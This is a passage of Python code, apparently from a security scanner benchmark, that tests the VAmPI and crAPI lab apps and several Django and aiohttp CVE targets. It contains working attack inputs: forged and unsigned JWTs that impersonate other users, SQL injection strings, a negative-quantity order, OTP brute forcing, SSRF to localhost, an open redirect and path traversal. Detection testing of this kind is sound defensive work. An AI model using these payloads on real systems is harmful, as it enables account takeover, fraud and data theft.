    if _json(response).get("data", {}).get("username") == "admin":
        runner.add(
            "VAMPI-WEAK-JWT",
            str(response.url),
            "A token signed with the fixed application secret was accepted.",
            {"forged_subject": "admin", "secret_source": "application configuration"},
        )

    if admin_token:
        for username in (admin_username, victim_username):
            runner.request(
                "DELETE",
                runner.base_url + f"/users/v1/{username}",
                headers={"Authorization": f"Bearer {admin_token}"},
            )
    return runner.findings


def _find_nested_value(payload: Any, keys: set[str]) -> Any:
    if isinstance(payload, dict):
        for key, value in payload.items():
            if key in keys and value is not None:
                return value
        for value in payload.values():
            found = _find_nested_value(value, keys)
            if found is not None:
                return found
    if isinstance(payload, list):
        for value in payload:
            found = _find_nested_value(value, keys)
            if found is not None:
                return found
    return None


def _run_crapi(runner: _BenchmarkRunner) -> list[Finding]:
    suffix = secrets.token_hex(4)
    email = f"scanner_{suffix}@example.test"
    password = f"Scanner-{suffix}-Aa1!"
    signup = runner.post(
        "/identity/api/auth/signup",
        json={
            "name": f"Scanner {suffix}",
            "email": email,
            "number": f"9{secrets.randbelow(1_000_000_000):09d}",
            "password": password,
        },
    )
    if signup.status_code != 200:
        email = "test@example.com"
        password = "Test!123"

    login = runner.post(
        "/identity/api/auth/login",
        json={"email": email, "password": password},
    )
    token = str(_json(login).get("token") or "")
    if not token:
        return runner.findings
    auth_headers = {"Authorization": f"Bearer {token}"}

    vehicle_id = "f89b5f21-7829-45cb-a650-299a61090378"
    vehicle = runner.get(
        f"/identity/api/v2/vehicle/{vehicle_id}/location",
        headers=auth_headers,
    )
    vehicle_body = _json(vehicle)
    vehicle_text = _text(vehicle).lower()
    if vehicle.status_code == 200 and (
        "latitude" in vehicle_text
        or "longitude" in vehicle_text
        or "fullname" in vehicle_text
    ):
        runner.add(
            "CRAPI-BOLA-VEHICLE",
            str(vehicle.url),
            "A normal user read location data for a seeded vehicle owned by another user.",
            {
                "vehicle_id": vehicle_id,
                "response_keys": sorted(vehicle_body),
            },
        )

    dashboard = runner.get(
        "/identity/api/v2/user/dashboard",
        headers=auth_headers,
    )
    initial_credit = _find_nested_value(
        _json(dashboard),
        {"available_credit", "availableCredit", "credit"},
    )
    products = runner.get(
        "/workshop/api/shop/products",
        headers=auth_headers,
    )
    product_payload = _json(products)
    product_items = (
        product_payload.get("products")
        if isinstance(product_payload.get("products"), list)
        else _json_array(products)
    )
    product = next(
        (
            item
            for item in product_items
            if isinstance(item, dict)
            and item.get("id") is not None
            and item.get("price") is not None
        ),
        None,
    )
    if product is not None and initial_credit is not None:
        order = runner.post(
            "/workshop/api/shop/orders",
            headers=auth_headers,
            json={"product_id": product["id"], "quantity": -1},
        )
        order_body = _json(order)
        final_credit = order_body.get("credit")
        try:
            credit_increased = float(final_credit) > float(initial_credit)
        except (TypeError, ValueError):
            credit_increased = False
        if order.status_code == 200 and credit_increased:
            runner.add(
                "CRAPI-NEGATIVE-QUANTITY",
                str(order.url),
                "A negative order quantity was accepted and increased account credit.",
                {
                    "product_id": product["id"],
                    "quantity": -1,
                    "credit_before": initial_credit,
                    "credit_after": final_credit,
                },
            )

    runner.post(
        "/workshop/api/shop/apply_coupon",
        headers=auth_headers,
        json={"coupon_code": "TRAC075", "amount": 75},
    )
    coupon = runner.post(
        "/workshop/api/shop/apply_coupon",
        headers=auth_headers,
        json={"coupon_code": "x' OR 1=1 -- ", "amount": 1},
    )
    coupon_text = _text(coupon)
    if (
        coupon.status_code == 400
        and "TRAC075" in coupon_text
        and "already claimed" in coupon_text.lower()
    ):
        runner.add(
            "CRAPI-SQLI-COUPON",
            str(coupon.url),
            "A boolean SQL payload returned the previously claimed coupon row.",
            {
                "status_code": coupon.status_code,
                "response_excerpt": coupon_text[:300],
            },
        )

    otp_statuses = []
    for _ in range(12):
        otp = runner.post(
            "/identity/api/auth/v2/check-otp",
            json={"email": email, "otp": "0000", "password": password},
        )
        otp_statuses.append(otp.status_code)
    if len(otp_statuses) == 12 and 429 not in otp_statuses and 503 not in otp_statuses:
        runner.add(
            "CRAPI-OTP-BRUTE-FORCE",
            runner.base_url + "/identity/api/auth/v2/check-otp",
            "The legacy OTP endpoint accepted repeated invalid verification attempts without a limit.",
            {"attempts": len(otp_statuses), "status_codes": otp_statuses},
        )

    plain_header = _b64url(b'{"alg":"none","typ":"JWT"}')
    plain_payload = _b64url(
        json.dumps(
            {
                "sub": "adam007@example.com",
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600,
                "role": "ROLE_PREDEFINE",
            },
            separators=(",", ":"),
        ).encode("utf-8")
    )
    unsigned_token = f"{plain_header}.{plain_payload}."
    forged_dashboard = runner.get(
        "/identity/api/v2/user/dashboard",
        headers={"Authorization": f"Bearer {unsigned_token}"},
    )
    forged_body = _json(forged_dashboard)
    if forged_dashboard.status_code == 200 and (
        forged_body.get("email") == "adam007@example.com"
        or _find_nested_value(forged_body, {"email"}) == "adam007@example.com"
    ):
        runner.add(
            "CRAPI-JWT-INVALID-SIGNATURE",
            str(forged_dashboard.url),
            "An unsigned JWT with another user's subject was accepted by the dashboard API.",
            {
                "forged_subject": "adam007@example.com",
                "algorithm": "none",
            },
        )

    ssrf = runner.post(
        "/workshop/api/merchant/contact_mechanic",
        headers=auth_headers,
        json={
            "mechanic_api": (
                "http://127.0.0.1:18080/workshop/api/shop/products"
            )
        },
    )
    ssrf_body = _json(ssrf)
    inner_status = ssrf_body.get("status")
    if (
        ssrf.status_code == 200
        and inner_status == 200
        and "response_from_mechanic_api" in ssrf_body
        and "products" in _text(ssrf).lower()
    ):
        runner.add(
            "CRAPI-SSRF-MECHANIC",
            str(ssrf.url),
            "The contact mechanic endpoint fetched an arbitrary internal service URL.",
            {
                "target_url": (
                    "http://127.0.0.1:18080/workshop/api/shop/products"
                ),
                "inner_status": inner_status,
            },
        )
    return runner.findings


def _run_cve_2018_14574(runner: _BenchmarkRunner) -> list[Finding]:
    response = runner.get("//www.example.com", follow_redirects=False)
    location = response.headers.get("location", "")
    if response.status_code in {301, 302} and location.startswith("//www.example.com/"):
        runner.add(
            "CVE-2018-14574",
            str(response.url),
            "CommonMiddleware redirected a protocol-relative path externally.",
            {"status_code": response.status_code, "location": location},
        )
    return runner.findings


def _run_cve_2019_14234(runner: _BenchmarkRunner) -> list[Finding]:
    login_page = runner.get("/admin/login/?next=/admin/")
    token_match = re.search(
        r'name="csrfmiddlewaretoken" value="([^"]+)"',
        _text(login_page),
    )
    if not token_match:
        return runner.findings
    login = runner.post(
        "/admin/login/?next=/admin/",
        data={
            "csrfmiddlewaretoken": token_match.group(1),
            "username": "scanner",
            "password": "Scanner!123",
            "next": "/admin/",
        },
        headers={"Referer": runner.base_url + "/admin/login/?next=/admin/"},
        follow_redirects=False,
    )
    if login.status_code not in {200, 302}:
        return runner.findings
    response = runner.get("/admin/vuln/collection/?detail__a%27b=123")
    body = _text(response)
    if response.status_code >= 500 and any(
        marker in body
        for marker in ("ProgrammingError", "syntax error", "SQLSTATE", "psycopg")
    ):
        runner.add(
            "CVE-2019-14234",
            str(response.url),
            "A crafted JSONField lookup reached the SQL layer and raised a database error.",
            {"status_code": response.status_code, "response_excerpt": body[:300]},
        )
    return runner.findings


def _run_cve_2021_35042(runner: _BenchmarkRunner) -> list[Finding]:
    response = runner.get(
        "/vuln/",
        params={
            "order": (
                "vuln_collection.name);select "
                "updatexml(1,concat(0x7e,(select sqlite_version())),1)#"
            )
        },
    )
    body = _text(response)
    if response.status_code >= 500 and (
        "one statement at a time" in body
        or "ProgrammingError" in body
        or "OperationalError" in body
    ):
        runner.add(
            "CVE-2021-35042",
            str(response.url),
            "The order parameter escaped the intended expression and reached the database.",
            {"status_code": response.status_code, "response_excerpt": body[:300]},
        )
    return runner.findings


def _run_cve_2022_34265(runner: _BenchmarkRunner) -> list[Finding]:
    response = runner.get("/", params={"date": "xxxx'xxxx"})
    body = _text(response)
    if response.status_code >= 500 and any(
        marker in body for marker in ("ProgrammingError", "syntax error", "psycopg")
    ):
        runner.add(
            "CVE-2022-34265",
            str(response.url),
            "The Trunc kind parameter was interpolated into the database query.",
            {"status_code": response.status_code, "response_excerpt": body[:300]},
        )
    return runner.findings


def _run_cve_2024_23334(runner: _BenchmarkRunner) -> list[Finding]:
    response = runner.get("/static/escape/win.ini")
    body = _text(response)
    if response.status_code == 200 and (
        "[fonts]" in body.lower() or "[extensions]" in body.lower()
    ):
        runner.add(
            "CVE-2024-23334",
            str(response.url),
            "The static route followed a symlink outside its configured root.",
            {
                "status_code": response.status_code,
                "outside_root_marker": "[fonts]",
            },
        )
    return runner.findings
